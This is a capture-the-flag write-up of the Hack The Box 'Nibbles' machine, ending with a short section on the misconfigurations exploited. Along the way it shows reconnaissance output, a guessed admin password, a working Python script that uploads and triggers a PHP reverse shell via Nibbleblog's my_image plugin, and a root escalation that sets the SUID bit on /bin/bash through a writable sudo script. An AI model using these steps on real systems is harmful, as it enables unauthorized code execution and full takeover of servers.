# Nibbles

```
kali@kali:~/htb/Nibbles$ sudo nmap -sV -sC  10.129.88.236
[sudo] password for kali:
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-28 23:37 EST
Nmap scan report for 10.129.88.236
Host is up (0.029s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.19 seconds
```

I check the source-code and it tells me to go to /nibbleblog/

So I do. Just a typical blog interface. I check /admin and /login. Admin.php results in a login



```
kali@kali:~/htb/Nibbles$ searchsploit nibbleblog
-------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                    |  Path
-------------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                            | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                             | php/remote/38489.rb
-------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I check the exploit and we do need the login info to upload the file. 

```
kali@kali:~/htb/Nibbles$ sudo wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.129.88.236/nibbleblog/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.0.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.88.236/nibbleblog/FUZZ
Total requests: 220560

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                            
===================================================================

000000001:   200        60 L     168 W    2985 Ch     "# directory-list-2.3-medium.txt"                                  
000000003:   200        60 L     168 W    2985 Ch     "# Copyright 2007 James Fisher"                                    
000000007:   200        60 L     168 W    2985 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"  
000000013:   200        60 L     168 W    2985 Ch     "#"                                                                
000000014:   200        60 L     168 W    2985 Ch     "http://10.129.88.236/nibbleblog/"                                 
000000011:   200        60 L     168 W    2985 Ch     "# Priority ordered case sensative list, where entries were found"
000000010:   200        60 L     168 W    2985 Ch     "#"                                                                
000000009:   200        60 L     168 W    2985 Ch     "# Suite 300, San Francisco, California, 94105, USA."              
000000012:   200        60 L     168 W    2985 Ch     "# on atleast 2 different hosts"                                   
000000004:   200        60 L     168 W    2985 Ch     "#"                                                                
000000005:   200        60 L     168 W    2985 Ch     "# This work is licensed under the Creative Commons"               
000000006:   200        60 L     168 W    2985 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"    
000000002:   200        60 L     168 W    2985 Ch     "#"                                                                
000000008:   200        60 L     168 W    2985 Ch     "# or send a letter to Creative Commons, 171 Second Street,"       
000000075:   200        18 L     82 W     1355 Ch     "content"                                                          
000000127:   200        20 L     104 W    1743 Ch     "themes"                                                           
000000259:   200        22 L     126 W    2129 Ch     "admin"                                                            
000000519:   200        30 L     214 W    3779 Ch     "plugins"                                                          
000000897:   200        63 L     643 W    4624 Ch     "README"                                                           
000000935:   200        27 L     181 W    3169 Ch     "languages"                                                        
000045240:   200        60 L     168 W    2985 Ch     "http://10.129.88.236/nibbleblog/"     
```

I run wfuzz to see if I can find anything to use here. I also run with some extensions like .txt and .php.


I found install.php which crashed the box. And I had to reset it. Makes sense.

But http://10.129.79.148/nibbleblog/update.php reveals some databases:

``` 
DB updated: ./content/private/config.xml

DB updated: ./content/private/comments.xml
```

So I head over to /content.

And I find three directories;:

```
[DIR]    private/    2017-12-28 09:02     -     
[DIR]    public/    2017-12-10 23:27     -     
[DIR]    tmp/    2017-12-10 23:27     -     
```


In private I find users.xml, which includes the username admin. So now we only need a password.

I tried using hydra, but either it did not work, or I misconfigured it, or the site has some sort of brute-force protection.

So I decide to try cewl to see if that can find some possible passwords:

```
kali@kali:~/htb/Nibbles$ sudo cewl -d 3 -m 5 -w nibbles.txt http://10.129.79.148/nibbleblog
[sudo] password for kali:
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
kali@kali:~/htb/Nibbles$ wc -l nibbles.txt
18 nibbles.txt
kali@kali:~/htb/Nibbles$ cat nibbles.txt
Nibbles
Hello
world
posts
Uncategorised
Music
Videos
HEADER
PLUGINS
Categories
Latest
image
Pages
There
FOOTER
Powered
Nibbleblog
nibbleblog
```

-d is the depth of the search. 

-m is the minimum string length. I set it to 5.

-w is what file it should be written to.

Most of these are not really valuable. But I guess I’ll try Nibbles, it is the name of the box. 

And “nibbles” actually appears in rockyou.txt as well, so it is a common password:

```
kali@kali:~/htb/Nibbles$ cat /usr/share/wordlists/rockyou.txt | grep "nibbles"
nibbles
```

“Nibbles” does not work, but “nibbles” does.

I can now create new blog posts. I try an XSS attack, but it’s not giving results. So let’s go back to that exploit we found earlier. It is for version 4.0.3 which is what we got here.

The exploit uses a mistake in the ajax image uploader. If we go to the uploader and attempt to upload our php reverse shell as an image we get this:

```
Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26

Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27

Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117

Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118

Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43

Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
```

So I wrote a python script to upload and load the reverse shell:


```
import requests
import sys

# Set headers and cookie. Cookie is just taken from browser.

headers = {
            'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
            'Cookie':'7dvu283s5u9h55a0huocta49t1'
        }


# The url to execute the upload.

payload_url = "http://10.129.79.148/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image"

# Just read the reverse shell as bytes.
payload = open("php-reverse-shell.php", "rb")

# Add the required data by the my_image plugin
files = {
            'plugin': (
                None,
                b'my_image',
                '',
                '',
            ),
            'title': (
                None,
                b'My image',
                '',
                '',
            ),
            'position': (
                None,
                b'4',
                '',
                ''
            ),
            'caption': (
                None,
                b'',
                '',
                '',
            ),
            'image':(
                'shell.php',
                payload,
                'application/x-php',
                '',
            ),
            'image_resize':(
                None,
                b'1',
                '',
                '',
            ),
            'image_width':(
                None,
                b'230',
                '',
                '',
            ),
            'image_height':(
                None,
                b'200',
                '',
                '',
            ),
            'image_option':(
                None,
                b'auto',
                '',
                '',
            )
        }

# Upload the image
response = requests.post(payload_url,files=files,headers=headers)
print(response)

# Activate reverse shell
url = "http://10.129.79.148/nibbleblog/content/private/plugins/my_image/image.php"
response = requests.get(url,headers=headers)
print(response)

```

And on our listener:

```
kali@kali:~/htb/Nibbles$ sudo nc -nlvp 1337
[sudo] password for kali:
Listening on 0.0.0.0 1337
Connection received on 10.129.79.148 41576
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 18:14:51 up 18:16,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
nibbler
$
```

Ok, let’s elevate the shell to a tty/pty shell and look around.

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Sudo -l took a while which got me worried that it crashed, but it was all good.

While grabbing the user.txt flag, I saw a zip file called personal.zip in Nibblers home folder.

Which I unzipped. This revealed a shell script:


``` 
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
...
```

So everyone can read, write and execute this script. And we can execute it with sudo without needing a password. Easy.

Let’s modify the script to run some privilege escalation:

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
#!/bin/bash

chmod 4755 /bin/bash
``` 

This simply changes the permissions for bash so that everyone can execute it.

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
sudo: unable to resolve host Nibbles: Connection timed out
nibbler@Nibbles:/home/nibbler/personal/stuff$
```

It times out after running, but let’s check if we can use bash:

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ bash -p
bash-4.3# whoami
root
bash-4.3
```

And we got it.

## Comparing myself to the official writeup:

The official writeup pretty much used the same methods I did, except they guessed the password without using cewl. They also just created their own monitor.sh file instead of extracting and modifying the existing one.


## How to stop this exploit:

There was quite a bit wrong with this one.
At first, the nibbleblog was not even accessible unless you viewed the source code of a pretty muhc empty page. After this, the user information was publicly available just by looking around in the directories.And after this the password was easily guessable. After this the user of the machine has write access to a sudo shell script. Which pretty much gives the user full sudo control.
